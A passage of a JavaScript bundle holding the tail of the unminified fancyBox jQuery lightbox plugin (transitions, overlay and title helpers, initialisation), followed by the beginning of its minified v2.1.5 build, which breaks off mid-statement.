				$(current.tpl.closeBtn).appendTo(F.skin).bind('click.fb', function(e) {
					e.preventDefault();

					F.close();
				});
			}

			// Create navigation arrows
			if (current.arrows && F.group.length > 1) {
				if (current.loop || current.index > 0) {
					$(current.tpl.prev).appendTo(F.outer).bind('click.fb', F.prev);
				}

				if (current.loop || current.index < F.group.length - 1) {
					$(current.tpl.next).appendTo(F.outer).bind('click.fb', F.next);
				}
			}

			F.trigger('afterShow');

			// Stop the slideshow if this is the last item
			if (!current.loop && current.index === current.group.length - 1) {

				F.play( false );

			} else if (F.opts.autoPlay && !F.player.isActive) {
				F.opts.autoPlay = false;

				F.play(true);
			}
		},

		_afterZoomOut: function ( obj ) {
			obj = obj || F.current;

			$('.fancybox-wrap').trigger('onReset').remove();

			$.extend(F, {
				group  : {},
				opts   : {},
				router : false,
				current   : null,
				isActive  : false,
				isOpened  : false,
				isOpen    : false,
				isClosing : false,
				wrap   : null,
				skin   : null,
				outer  : null,
				inner  : null
			});

			F.trigger('afterClose', obj);
		}
	});

	/*
	 *	Default transitions
	 */

	F.transitions = {
		getOrigPosition: function () {
			var current  = F.current,
				element  = current.element,
				orig     = current.orig,
				pos      = {},
				width    = 50,
				height   = 50,
				hPadding = current.hPadding,
				wPadding = current.wPadding,
				viewport = F.getViewport();

			if (!orig && current.isDom && element.is(':visible')) {
				orig = element.find('img:first');

				if (!orig.length) {
					orig = element;
				}
			}

			if (isQuery(orig)) {
				pos = orig.offset();

				if (orig.is('img')) {
					width  = orig.outerWidth();
					height = orig.outerHeight();
				}

			} else {
				pos.top  = viewport.y + (viewport.h - height) * current.topRatio;
				pos.left = viewport.x + (viewport.w - width)  * current.leftRatio;
			}

			if (F.wrap.css('position') === 'fixed' || current.locked) {
				pos.top  -= viewport.y;
				pos.left -= viewport.x;
			}

			pos = {
				top     : getValue(pos.top  - hPadding * current.topRatio),
				left    : getValue(pos.left - wPadding * current.leftRatio),
				width   : getValue(width  + wPadding),
				height  : getValue(height + hPadding)
			};

			return pos;
		},

		step: function (now, fx) {
			var ratio,
				padding,
				value,
				prop       = fx.prop,
				current    = F.current,
				wrapSpace  = current.wrapSpace,
				skinSpace  = current.skinSpace;

			if (prop === 'width' || prop === 'height') {
				ratio = fx.end === fx.start ? 1 : (now - fx.start) / (fx.end - fx.start);

				if (F.isClosing) {
					ratio = 1 - ratio;
				}

				padding = prop === 'width' ? current.wPadding : current.hPadding;
				value   = now - padding;

				F.skin[ prop ](  getScalar( prop === 'width' ?  value : value - (wrapSpace * ratio) ) );
				F.inner[ prop ]( getScalar( prop === 'width' ?  value : value - (wrapSpace * ratio) - (skinSpace * ratio) ) );
			}
		},

		zoomIn: function () {
			var current  = F.current,
				startPos = current.pos,
				effect   = current.openEffect,
				elastic  = effect === 'elastic',
				endPos   = $.extend({opacity : 1}, startPos);

			// Remove "position" property that breaks older IE
			delete endPos.position;

			if (elastic) {
				startPos = this.getOrigPosition();

				if (current.openOpacity) {
					startPos.opacity = 0.1;
				}

			} else if (effect === 'fade') {
				startPos.opacity = 0.1;
			}

			F.wrap.css(startPos).animate(endPos, {
				duration : effect === 'none' ? 0 : current.openSpeed,
				easing   : current.openEasing,
				step     : elastic ? this.step : null,
				complete : F._afterZoomIn
			});
		},

		zoomOut: function () {
			var current  = F.current,
				effect   = current.closeEffect,
				elastic  = effect === 'elastic',
				endPos   = {opacity : 0.1};

			if (elastic) {
				endPos = this.getOrigPosition();

				if (current.closeOpacity) {
					endPos.opacity = 0.1;
				}
			}

			F.wrap.animate(endPos, {
				duration : effect === 'none' ? 0 : current.closeSpeed,
				easing   : current.closeEasing,
				step     : elastic ? this.step : null,
				complete : F._afterZoomOut
			});
		},

		changeIn: function () {
			var current   = F.current,
				effect    = current.nextEffect,
				startPos  = current.pos,
				endPos    = { opacity : 1 },
				direction = F.direction,
				distance  = 200,
				field;

			startPos.opacity = 0.1;

			if (effect === 'elastic') {
				field = direction === 'down' || direction === 'up' ? 'top' : 'left';

				if (direction === 'down' || direction === 'right') {
					startPos[ field ] = getValue(getScalar(startPos[ field ]) - distance);
					endPos[ field ]   = '+=' + distance + 'px';

				} else {
					startPos[ field ] = getValue(getScalar(startPos[ field ]) + distance);
					endPos[ field ]   = '-=' + distance + 'px';
				}
			}

			// Workaround for http://bugs.jquery.com/ticket/12273
			if (effect === 'none') {
				F._afterZoomIn();

			} else {
				F.wrap.css(startPos).animate(endPos, {
					duration : current.nextSpeed,
					easing   : current.nextEasing,
					complete : F._afterZoomIn
				});
			}
		},

		changeOut: function () {
			var previous  = F.previous,
				effect    = previous.prevEffect,
				endPos    = { opacity : 0.1 },
				direction = F.direction,
				distance  = 200;

			if (effect === 'elastic') {
				endPos[ direction === 'down' || direction === 'up' ? 'top' : 'left' ] = ( direction === 'up' || direction === 'left' ? '-' : '+' ) + '=' + distance + 'px';
			}

			previous.wrap.animate(endPos, {
				duration : effect === 'none' ? 0 : previous.prevSpeed,
				easing   : previous.prevEasing,
				complete : function () {
					$(this).trigger('onReset').remove();
				}
			});
		}
	};

	/*
	 *	Overlay helper
	 */

	F.helpers.overlay = {
		defaults : {
			closeClick : true,      // if true, fancyBox will be closed when user clicks on the overlay
			speedOut   : 200,       // duration of fadeOut animation
			showEarly  : true,      // indicates if should be opened immediately or wait until the content is ready
			css        : {},        // custom CSS properties
			locked     : !isTouch,  // if true, the content will be locked into overlay
			fixed      : true       // if false, the overlay CSS position property will not be set to "fixed"
		},

		overlay : null,      // current handle
		fixed   : false,     // indicates if the overlay has position "fixed"
		el      : $('html'), // element that contains "the lock"

		// Public methods
		create : function(opts) {
			var parent;

			opts = $.extend({}, this.defaults, opts);

			if (this.overlay) {
				this.close();
			}

			parent = F.coming ? F.coming.parent : opts.parent;

			this.overlay = $('<div class="fancybox-overlay"></div>').appendTo( parent && parent.length ? parent : 'body' );
			this.fixed   = false;

			if (opts.fixed && F.defaults.fixed) {
				this.overlay.addClass('fancybox-overlay-fixed');

				this.fixed = true;
			}
		},

		open : function(opts) {
			var that = this;

			opts = $.extend({}, this.defaults, opts);

			if (this.overlay) {
				this.overlay.unbind('.overlay').width('auto').height('auto');

			} else {
				this.create(opts);
			}

			if (!this.fixed) {
				W.bind('resize.overlay', $.proxy( this.update, this) );

				this.update();
			}

			if (opts.closeClick) {
				this.overlay.bind('click.overlay', function(e) {
					if ($(e.target).hasClass('fancybox-overlay')) {
						if (F.isActive) {
							F.close();
						} else {
							that.close();
						}

						return false;
					}
				});
			}

			this.overlay.css( opts.css ).show();
		},

		close : function() {
			W.unbind('resize.overlay');

			if (this.el.hasClass('fancybox-lock')) {
				$('.fancybox-margin').removeClass('fancybox-margin');

				this.el.removeClass('fancybox-lock');

				W.scrollTop( this.scrollV ).scrollLeft( this.scrollH );
			}

			$('.fancybox-overlay').remove().hide();

			$.extend(this, {
				overlay : null,
				fixed   : false
			});
		},

		// Private, callbacks

		update : function () {
			var width = '100%', offsetWidth;

			// Reset width/height so it will not mess
			this.overlay.width(width).height('100%');

			// jQuery does not return reliable result for IE
			if (IE) {
				offsetWidth = Math.max(document.documentElement.offsetWidth, document.body.offsetWidth);

				if (D.width() > offsetWidth) {
					width = D.width();
				}

			} else if (D.width() > W.width()) {
				width = D.width();
			}

			this.overlay.width(width).height(D.height());
		},

		// This is where we can manipulate DOM, because later it would cause iframes to reload
		onReady : function (opts, obj) {
			var overlay = this.overlay;

			$('.fancybox-overlay').stop(true, true);

			if (!overlay) {
				this.create(opts);
			}

			if (opts.locked && this.fixed && obj.fixed) {
				obj.locked = this.overlay.append( obj.wrap );
				obj.fixed  = false;
			}

			if (opts.showEarly === true) {
				this.beforeShow.apply(this, arguments);
			}
		},

		beforeShow : function(opts, obj) {
			if (obj.locked && !this.el.hasClass('fancybox-lock')) {
				if (this.fixPosition !== false) {
					$('*').filter(function(){
						return ($(this).css('position') === 'fixed' && !$(this).hasClass("fancybox-overlay") && !$(this).hasClass("fancybox-wrap") );
					}).addClass('fancybox-margin');
				}

				this.el.addClass('fancybox-margin');

				this.scrollV = W.scrollTop();
				this.scrollH = W.scrollLeft();

				this.el.addClass('fancybox-lock');

				W.scrollTop( this.scrollV ).scrollLeft( this.scrollH );
			}

			this.open(opts);
		},

		onUpdate : function() {
			if (!this.fixed) {
				this.update();
			}
		},

		afterClose: function (opts) {
			// Remove overlay if exists and fancyBox is not opening
			// (e.g., it is not being open using afterClose callback)
			if (this.overlay && !F.coming) {
				this.overlay.fadeOut(opts.speedOut, $.proxy( this.close, this ));
			}
		}
	};

	/*
	 *	Title helper
	 */

	F.helpers.title = {
		defaults : {
			type     : 'float', // 'float', 'inside', 'outside' or 'over',
			position : 'bottom' // 'top' or 'bottom'
		},

		beforeShow: function (opts) {
			var current = F.current,
				text    = current.title,
				type    = opts.type,
				title,
				target;

			if ($.isFunction(text)) {
				text = text.call(current.element, current);
			}

			if (!isString(text) || $.trim(text) === '') {
				return;
			}

			title = $('<div class="fancybox-title fancybox-title-' + type + '-wrap">' + text + '</div>');

			switch (type) {
				case 'inside':
					target = F.skin;
				break;

				case 'outside':
					target = F.wrap;
				break;

				case 'over':
					target = F.inner;
				break;

				default: // 'float'
					target = F.skin;

					title.appendTo('body');

					if (IE) {
						title.width( title.width() );
					}

					title.wrapInner('<span class="child"></span>');

					//Increase bottom margin so this title will also fit into viewport
					F.current.margin[2] += Math.abs( getScalar(title.css('margin-bottom')) );
				break;
			}

			title[ (opts.position === 'top' ? 'prependTo'  : 'appendTo') ](target);
		}
	};

	// jQuery plugin initialization
	$.fn.fancybox = function (options) {
		var index,
			that     = $(this),
			selector = this.selector || '',
			run      = function(e) {
				var what = $(this).blur(), idx = index, relType, relVal;

				if (!(e.ctrlKey || e.altKey || e.shiftKey || e.metaKey) && !what.is('.fancybox-wrap')) {
					relType = options.groupAttr || 'data-fancybox-group';
					relVal  = what.attr(relType);

					if (!relVal) {
						relType = 'rel';
						relVal  = what.get(0)[ relType ];
					}

					if (relVal && relVal !== '' && relVal !== 'nofollow') {
						what = selector.length ? $(selector) : that;
						what = what.filter('[' + relType + '="' + relVal + '"]');
						idx  = what.index(this);
					}

					options.index = idx;

					// Stop an event from bubbling if everything is fine
					if (F.open(what, options) !== false) {
						e.preventDefault();
					}
				}
			};

		options = options || {};
		index   = options.index || 0;

		if (!selector || options.live === false) {
			that.unbind('click.fb-start').bind('click.fb-start', run);

		} else {
			D.undelegate(selector, 'click.fb-start').delegate(selector + ":not('.fancybox-item, .fancybox-nav')", 'click.fb-start', run);
		}

		this.filter('[data-fancybox-start=1]').trigger('click');

		return this;
	};

	// Tests that need a body at doc ready
	D.ready(function() {
		var w1, w2;

		if ( $.scrollbarWidth === undefined ) {
			// http://benalman.com/projects/jquery-misc-plugins/#scrollbarwidth
			$.scrollbarWidth = function() {
				var parent = $('<div style="width:50px;height:50px;overflow:auto"><div/></div>').appendTo('body'),
					child  = parent.children(),
					width  = child.innerWidth() - child.height( 99 ).innerWidth();

				parent.remove();

				return width;
			};
		}

		if ( $.support.fixedPosition === undefined ) {
			$.support.fixedPosition = (function() {
				var elem  = $('<div style="position:fixed;top:20px;"></div>').appendTo('body'),
					fixed = ( elem[0].offsetTop === 20 || elem[0].offsetTop === 15 );

				elem.remove();

				return fixed;
			}());
		}

		$.extend(F.defaults, {
			scrollbarWidth : $.scrollbarWidth(),
			fixed  : $.support.fixedPosition,
			parent : $('body')
		});

		//Get real width of page scroll-bar
		w1 = $(window).width();

		H.addClass('fancybox-lock-test');

		w2 = $(window).width();

		H.removeClass('fancybox-lock-test');

		$("<style type='text/css'>.fancybox-margin{margin-right:" + (w2 - w1) + "px;}</style>").appendTo("head");
	});

}(window, document, jQuery));

/*! fancyBox v2.1.5 fancyapps.com | fancyapps.com/fancybox/#license */
(function(s,H,f,w){var K=f("html"),q=f(s),p=f(H),b=f.fancybox=function(){b.open.apply(this,arguments)},J=navigator.userAgent.match(/msie/i),C=null,t=H.createTouch!==w,u=function(a){return a&&a.hasOwnProperty&&a instanceof f},r=function(a){return a&&"string"===f.type(a)},F=function(a){return r(a)&&0<a.indexOf("%")},m=function(a,d){var e=parseInt(a,10)||0;d&&F(a)&&(e*=b.getViewport()[d]/100);return Math.ceil(e)},x=function(a,b){return m(a,b)+"px"};f.extend(b,{version:"2.1.5",defaults:{padding:15,margin:20,
width:800,height:600,minWidth:100,minHeight:100,maxWidth:9999,maxHeight:9999,pixelRatio:1,autoSize:!0,autoHeight:!1,autoWidth:!1,autoResize:!0,autoCenter:!t,fitToView:!0,aspectRatio:!1,topRatio:0.5,leftRatio:0.5,scrolling:"auto",wrapCSS:"",arrows:!0,closeBtn:!0,closeClick:!1,nextClick:!1,mouseWheel:!0,autoPlay:!1,playSpeed:3E3,preload:3,modal:!1,loop:!0,ajax:{dataType:"html",headers:{"X-fancyBox":!0}},iframe:{scrolling:"auto",preload:!0},swf:{wmode:"transparent",allowfullscreen:"true",allowscriptaccess:"always"},
keys:{next:{13:"left",34:"up",39:"left",40:"up"},prev:{8:"right",33:"down",37:"right",38:"down"},close:[27],play:[32],toggle:[70]},direction:{next:"left",prev:"right"},scrollOutside:!0,index:0,type:null,href:null,content:null,title:null,tpl:{wrap:'<div class="fancybox-wrap" tabIndex="-1"><div class="fancybox-skin"><div class="fancybox-outer"><div class="fancybox-inner"></div></div></div></div>',image:'<img class="fancybox-image" src="{href}" alt="" />',iframe:'<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen'+
(J?' allowtransparency="true"':"")+"></iframe>",error:'<p class="fancybox-error">The requested content cannot be loaded.<br/>Please try again later.</p>',closeBtn:'<a title="Close" class="fancybox-item fancybox-close" href="javascript:;"></a>',next:'<a title="Next" class="fancybox-nav fancybox-next" href="javascript:;"><span></span></a>',prev:'<a title="Previous" class="fancybox-nav fancybox-prev" href="javascript:;"><span></span></a>'},openEffect:"fade",openSpeed:250,openEasing:"swing",openOpacity:!0,
openMethod:"zoomIn",closeEffect:"fade",closeSpeed:250,closeEasing:"swing",closeOpacity:!0,closeMethod:"zoomOut",nextEffect:"elastic",nextSpeed:250,nextEasing:"swing",nextMethod:"changeIn",prevEffect:"elastic",prevSpeed:250,prevEasing:"swing",prevMethod:"changeOut",helpers:{overlay:!0,title:!0},onCancel:f.noop,beforeLoad:f.noop,afterLoad:f.noop,beforeShow:f.noop,afterShow:f.noop,beforeChange:f.noop,beforeClose:f.noop,afterClose:f.noop},group:{},opts:{},previous:null,coming:null,current:null,isActive:!1,
isOpen:!1,isOpened:!1,wrap:null,skin:null,outer:null,inner:null,player:{timer:null,isActive:!1},ajaxLoad:null,imgPreload:null,transitions:{},helpers:{},open:function(a,d){if(a&&(f.isPlainObject(d)||(d={}),!1!==b.close(!0)))return f.isArray(a)||(a=u(a)?f(a).get():[a]),f.each(a,function(e,c){var l={},g,h,k,n,m;"object"===f.type(c)&&(c.nodeType&&(c=f(c)),u(c)?(l={href:c.data("fancybox-href")||c.attr("href"),title:f("<div/>").text(c.data("fancybox-title")||c.attr("title")).html(),isDom:!0,element:c},
f.metadata&&f.extend(!0,l,c.metadata())):l=c);g=d.href||l.href||(r(c)?c:null);h=d.title!==w?d.title:l.title||"";n=(k=d.content||l.content)?"html":d.type||l.type;!n&&l.isDom&&(n=c.data("fancybox-type"),n||(n=(n=c.prop("class").match(/fancybox\.(\w+)/))?n[1]:null));r(g)&&(n||(b.isImage(g)?n="image":b.isSWF(g)?n="swf":"#"===g.charAt(0)?n="inline":r(c)&&(n="html",k=c)),"ajax"===n&&(m=g.split(/\s+/,2),g=m.shift(),m=m.shift()));k||("inline"===n?g?k=f(r(g)?g.replace(/.*(?=#[^\s]+$)/,""):g):l.isDom&&(k=c):
"html"===n?k=g:n||g||!l.isDom||(n="inline",k=c));f.extend(l,{href:g,type:n,content:k,title:h,selector:m});a[e]=l}),b.opts=f.extend(!0,{},b.defaults,d),d.keys!==w&&(b.opts.keys=d.keys?f.extend({},b.defaults.keys,d.keys):!1),b.group=a,b._start(b.opts.index)},cancel:function(){var a=b.coming;a&&!1===b.trigger("onCancel")||(b.hideLoading(),a&&(b.ajaxLoad&&b.ajaxLoad.abort(),b.ajaxLoad=null,b.imgPreload&&(b.imgPreload.onload=b.imgPreload.onerror=null),a.wrap&&a.wrap.stop(!0,!0).trigger("onReset").remove(),
b.coming=null,b.current||b._afterZoomOut(a)))},close:function(a){b.cancel();!1!==b.trigger("beforeClose")&&(b.unbindEvents(),b.isActive&&(b.isOpen&&!0!==a?(b.isOpen=b.isOpened=!1,b.isClosing=!0,f(".fancybox-item, .fancybox-nav").remove(),b.wrap.stop(!0,!0).removeClass("fancybox-opened"),b.transitions[b.current.closeMethod]()):(f(".fancybox-wrap").stop(!0).trigger("onReset").remove(),b._afterZoomOut())))},play:function(a){var d=function(){clearTimeout(b.player.timer)},e=function(){d();b.current&&b.player.isActive&&
(b.player.timer=setTimeout(b.next,b.current.playSpeed))},c=function(){d();p.unbind(".player");b.player.isActive=!1;b.trigger("onPlayEnd")};!0===a||!b.player.isActive&&!1!==a?b.current&&(b.current.loop||b.current.index<b.group.length-1)&&(b.player.isActive=!0,p.bind({"onCancel.player beforeClose.player":c,"onUpdate.player":e,"beforeLoad.player":d}),e(),b.trigger("onPlayStart")):c()},next:function(a){var d=b.current;d&&(r(a)||(a=d.direction.next),b.jumpto(d.index+1,a,"next"))},prev:function(a){var d=
b.current;d&&(r(a)||(a=d.direction.prev),b.jumpto(d.index-1,a,"prev"))},jumpto:function(a,d,e){var c=b.current;c&&(a=m(a),b.direction=d||c.direction[a>=c.index?"next":"prev"],b.router=e||"jumpto",c.loop&&(0>a&&(a=c.group.length+a%c.group.length),a%=c.group.length),c.group[a]!==w&&(b.cancel(),b._start(a)))},reposition:function(a,d){var e=b.current,c=e?e.wrap:null,l;c&&(l=b._getPosition(d),a&&"scroll"===a.type?(delete l.position,c.stop(!0,!0).animate(l,200)):(c.css(l),e.pos=f.extend({},e.dim,l)))},
update:function(a){var d=a&&a.originalEvent&&a.originalEvent.type,e=!d||"orientationchange"===d;e&&(clearTimeout(C),C=null);b.isOpen&&!C&&(C=setTimeout(function(){var c=b.current;c&&!b.isClosing&&(b.wrap.removeClass("fancybox-tmp"),(e||"load"===d||"resize"===d&&c.autoResize)&&b._setDimension(),"scroll"===d&&c.canShrink||b.reposition(a),b.trigger("onUpdate"),C=null)},e&&!t?0:300))},toggle:function(a){b.isOpen&&(b.current.fitToView="boolean"===f.type(a)?a:!b.current.fitToView,t&&(b.wrap.removeAttr("style").addClass("fancybox-tmp"),
b.trigger("onUpdate")),b.update())},hideLoading:function(){p.unbind(".loading");f("#fancybox-loading").remove()},showLoading:function(){var a,d;b.hideLoading();a=f('<div id="fancybox-loading"><div></div></div>').click(b.cancel).appendTo("body");p.bind("keydown.loading",function(a){27===(a.which||a.keyCode)&&(a.preventDefault(),b.cancel())});b.defaults.fixed||(d=b.getViewport(),a.css({position:"absolute",top:0.5*d.h+d.y,left:0.5*d.w+d.x}));b.trigger("onLoading")},getViewport:function(){var a=b.current&&
b.current.locked||!1,d={x:q.scrollLeft(),y:q.scrollTop()};a&&a.length?(d.w=a[0].clientWidth,d.h=a[0].clientHeight):(d.w=t&&s.innerWidth?s.innerWidth:q.width(),d.h=t&&s.innerHeight?s.innerHeight:q.height());return d},unbindEvents:function(){b.wrap&&u(b.wrap)&&b.wrap.unbind(".fb");p.unbind(".fb");q.unbind(".fb")},bindEvents:function(){var a=b.current,d;a&&(q.bind("orientationchange.fb"+(t?"":" resize.fb")+(a.autoCenter&&!a.locked?" scroll.fb":""),b.update),(d=a.keys)&&p.bind("keydown.fb",function(e){var c=
e.which||e.keyCode,l=e.target||e.srcElement;if(27===c&&b.coming)return!1;e.ctrlKey||e.altKey||e.shiftKey||e.metaKey||l&&(l.type||f(l).is("[contenteditable]"))||f.each(d,function(d,l){if(1<a.group.length&&l[c]!==w)return b[d](l[c]),e.preventDefault(),!1;if(-1<f.inArray(c,l))return b[d](),e.preventDefault(),!1})}),f.fn.mousewheel&&a.mouseWheel&&b.wrap.bind("mousewheel.fb",function(d,c,l,g){for(var h=f(d.target||null),k=!1;h.length&&!(k||h.is(".fancybox-skin")||h.is(".fancybox-wrap"));)k=h[0]&&!(h[0].style.overflow&&
"hidden"===h[0].style.overflow)&&(h[0].clientWidth&&h[0].scrollWidth>h[0].clientWidth||h[0].clientHeight&&h[0].scrollHeight>h[0].clientHeight),h=f(h).parent();0!==c&&!k&&1<b.group.length&&!a.canShrink&&(0<g||0<l?b.prev(0<g?"down":"left"):(0>g||0>l)&&b.next(0>g?"up":"right"),d.preventDefault())}))},trigger:function(a,d){var e,c=d||b.coming||b.current;if(c){f.isFunction(c[a])&&(e=c[a].apply(c,Array.prototype.slice.call(arguments,1)));if(!1===e)return!1;c.helpers&&f.each(c.helpers,function(d,e){if(e&&
b.helpers[d]&&f.isFunction(b.helpers[d][a]))b.helpers[d][a](f.extend(!0,{},b.helpers[d].defaults,e),c)})}p.trigger(a)},isImage:function(a){return r(a)&&a.match(/(^data:image\/.*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg)((\?|#).*)?$)/i)},isSWF:function(a){return r(a)&&a.match(/\.(swf)((\?|#).*)?$/i)},_start:function(a){var d={},e,c;a=m(a);e=b.group[a]||null;if(!e)return!1;d=f.extend(!0,{},b.opts,e);e=d.margin;c=d.padding;"number"===f.type(e)&&(d.margin=[e,e,e,e]);"number"===f.type(c)&&(d.padding=[c,c,
c,c]);d.modal&&f.extend(!0,d,{closeBtn:!1,closeClick:!1,nextClick:!1,arrows:!1,mouseWheel:!1,keys:null,helpers:{overlay:{closeClick:!1}}});d.autoSize&&(d.autoWidth=d.autoHeight=!0);"auto"===d.width&&(d.autoWidth=!0);"auto"===d.height&&(d.autoHeight=!0);d.group=b.group;d.index=a;b.coming=d;if(!1===b.trigger("beforeLoad"))b.coming=null;else{c=d.type;e=d.href;if(!c)return b.coming=null,b.current&&b.router&&"jumpto"!==b.router?(b.current.index=a,b[b.router](b.direction)):!1;b.isActive=!0;if("image"===
c||"swf"===c)d.autoHeight=d.autoWidth=!1,d.scrolling="visible";"image"===c&&(d.aspectRatio=!0);"iframe"===c&&t&&(d.scrolling="scroll");d.wrap=f(d.tpl.wrap).addClass("fancybox-"+(t?"mobile":"desktop")+" fancybox-type-"+c+" fancybox-tmp "+d.wrapCSS).appendTo(d.parent||"body");f.extend(d,{skin:f(".fancybox-skin",d.wrap),outer:f(".fancybox-outer",d.wrap),inner:f(".fancybox-inner",d.wrap)});f.each(["Top","Right","Bottom","Left"],function(a,b){d.skin.css("padding"+b,x(d.padding[a]))});b.trigger("onReady");
if("inline"===c||"html"===c){if(!d.content||!d.content.length)return b._error("content")}else if(!e)return b._error("href");"image"===c?b._loadImage():"ajax"===c?b._loadAjax():"iframe"===c?b._loadIframe():b._afterLoad()}},_error:function(a){f.extend(b.coming,{type:"html",autoWidth:!0,autoHeight:!0,minWidth:0,minHeight:0,scrolling:"no",hasError:a,content:b.coming.tpl.error});b._afterLoad()},_loadImage:function(){var a=b.imgPreload=new Image;a.onload=function(){this.onload=this.onerror=null;b.coming.width=
this.width/b.opts.pixelRatio;b.coming.height=this.height/b.opts.pixelRatio;b._afterLoad()};a.onerror=function(){this.onload=this.onerror=null;b._error("image")};a.src=b.coming.href;!0!==a.complete&&b.showLoading()},_loadAjax:function(){var a=b.coming;b.showLoading();b.ajaxLoad=f.ajax(f.extend({},a.ajax,{url:a.href,error:function(a,e){b.coming&&"abort"!==e?b._error("ajax",a):b.hideLoading()},success:function(d,e){"success"===e&&(a.content=d,b._afterLoad())}}))},_loadIframe:function(){var a=b.coming,
d=f(a.tpl.iframe.replace(/\{rnd\}/g,(new Date).getTime())).attr("scrolling",t?"auto":a.iframe.scrolling).attr("src",a.href);f(a.wrap).bind("onReset",function(){try{f(this).find("iframe").hide().attr("src","//about:blank").end().empty()}catch(a){}});a.iframe.preload&&(b.showLoading(),d.one("load",function(){f(this).data("ready",1);t||f(this).bind("load.fb",b.update);f(this).parents(".fancybox-wrap").width("100%").removeClass("fancybox-tmp").show();b._afterLoad()}));a.content=d.appendTo(a.inner);a.iframe.preload||
b._afterLoad()},_preloadImages:function(){var a=b.group,d=b.current,e=a.length,c=d.preload?Math.min(d.preload,e-1):0,f,g;for(g=1;g<=c;g+=1)f=a[(d.index+g)%e],"image"===f.type&&f.href&&((new Image).src=f.href)},_afterLoad:function(){var a=b.coming,d=b.current,e,c,l,g,h;b.hideLoading();if(a&&!1!==b.isActive)if(!1===b.trigger("afterLoad",a,d))a.wrap.stop(!0).trigger("onReset").remove(),b.coming=null;else{d&&(b.trigger("beforeChange",d),d.wrap.stop(!0).removeClass("fancybox-opened").find(".fancybox-item, .fancybox-nav").remove());
b.unbindEvents();e=a.content;c=a.type;l=a.scrolling;f.extend(b,{wrap:a.wrap,skin:a.skin,outer:a.outer,inner:a.inner,current:a,previous:d});g=a.href;switch(c){case "inline":case "ajax":case "html":a.selector?e=f("<div>").html(e).find(a.selector):u(e)&&(e.data("fancybox-placeholder")||e.data("fancybox-placeholder",f('<div class="fancybox-placeholder"></div>').insertAfter(e).hide()),e=e.show().detach(),a.wrap.bind("onReset",function(){f(this).find(e).length&&e.hide().replaceAll(e.data("fancybox-placeholder")).data("fancybox-placeholder",
!1)}));break;case "image":e=a.tpl.image.replace(/\{href\}/g,g);break;case "swf":e='<object id="fancybox-swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%"><param name="movie" value="'+g+'"></param>',h="",f.each(a.swf,function(a,b){e+='<param name="'+a+'" value="'+b+'"></param>';h+=" "+a+'="'+b+'"'}),e+='<embed src="'+g+'" type="application/x-shockwave-flash" width="100%" height="100%"'+h+"></embed></object>"}u(e)&&e.parent().is(a.inner)||a.inner.append(e);b.trigger("beforeShow");
a.inner.css("overflow","yes"===l?"scroll":"no"===l?"hidden":l);b._setDimension();b.reposition();b.isOpen=!1;b.coming=null;b.bindEvents();if(!b.isOpened)f(".fancybox-wrap").not(a.wrap).stop(!0).trigger("onReset").remove();else if(d.prevMethod)b.transitions[d.prevMethod]();b.transitions[b.isOpened?a.nextMethod:a.openMethod]();b._preloadImages()}},_setDimension:function(){var a=b.getViewport(),d=0,e=!1,c=!1,e=b.wrap,l=b.skin,g=b.inner,h=b.current,c=h.width,k=h.height,n=h.minWidth,v=h.minHeight,p=h.maxWidth,
q=h.maxHeight,t=h.scrolling,r=h.scrollOutside?h.scrollbarWidth:0,y=h.margin,z=m(y[1]+y[3]),s=m(y[0]+y[2]),w,A,u,D,B,G,C,E,I;e.add(l).add(g).width("auto").height("auto").removeClass("fancybox-tmp");y=m(l.outerWidth(!0)-l.width());w=m(l.outerHeight(!0)-l.height());A=z+y;u=s+w;D=F(c)?(a.w-A)*m(c)/100:c;B=F(k)?(a.h-u)*m(k)/100:k;if("iframe"===h.type){if(I=h.content,h.autoHeight&&1===I.data("ready"))try{I[0].contentWindow.document.location&&(g.width(D).height(9999),G=I.contents().find("body"),r&&G.css("overflow-x",
"hidden"),B=G.outerHeight(!0))}catch(H){}}else if(h.autoWidth||h.autoHeight)g.addClass("fancybox-tmp"),h.autoWidth||g.width(D),h.autoHeight||g.height(B),h.autoWidth&&(D=g.width()),h.autoHeight&&(B=g.height()),g.removeClass("fancybox-tmp");c=m(D);k=m(B);E=D/B;n=m(F(n)?m(n,"w")-A:n);p=m(F(p)?m(p,"w")-A:p);v=m(F(v)?m(v,"h")-u:v);q=m(F(q)?m(q,"h")-u:q);G=p;C=q;h.fitToView&&(p=Math.min(a.w-A,p),q=Math.min(a.h-u,q));A=a.w-z;s=a.h-s;h.aspectRatio?(c>p&&(c=p,k=m(c/E)),k>q&&(k=q,c=m(k*E)),c<n&&(c=n,k=m(c/
E)),k<v&&(k=v,c=m(k*E))):(c=Math.max(n,Math.min(c,p)),h.autoHeight&&"iframe"!==h.type&&(g.width(c),k=g.height()),k=Math.max(v,Math.min(k,q)));if(h.fitToView)if(g.width(c).height(k),e.width(c+y),a=e.width(),z=e.height(),h.aspectRatio)for(;(a>A||z>s)&&c>n&&k>v&&!(19<d++);)k=Math.max(v,Math.min(q,k-10)),c=m(k*E),c<n&&(c=n,k=m(c/E)),c>p&&(c=p,k=m(c/E)),g.width(c).height(k),e.width(c+y),a=e.width(),z=e.height();else c=Math.max(n,Math.min(c,c-(a-A))),k=Math.max(v,Math.min(k,k-(z-s)));r&&"auto"===t&&k<B&&
c+y+r<A&&(c+=r);g.width(c).height(k);e.width(c+y);a=e.width();z=e.height();e=(a>A||z>s)&&c>n&&k>v;c=h.aspectRatio?c<G&&k<C&&c<D&&k<B:(c<G||k<C)&&(c<D||k<B);f.extend(h,{dim:{width:x(a),height:x(z)},origWidth:D,origHeight:B,canShrink:e,canExpand:c,wPadding:y,hPadding:w,wrapSpace:z-l.outerHeight(!0),skinSpace:l.height()-k});!I&&h.autoHeight&&k>v&&k<q&&!c&&g.height("auto")},_getPosition:function(a){var d=b.current,e=b.getViewport(),c=d.margin,f=b.wrap.width()+c[1]+c[3],g=b.wrap.height()+c[0]+c[2],c={position:"absolute",
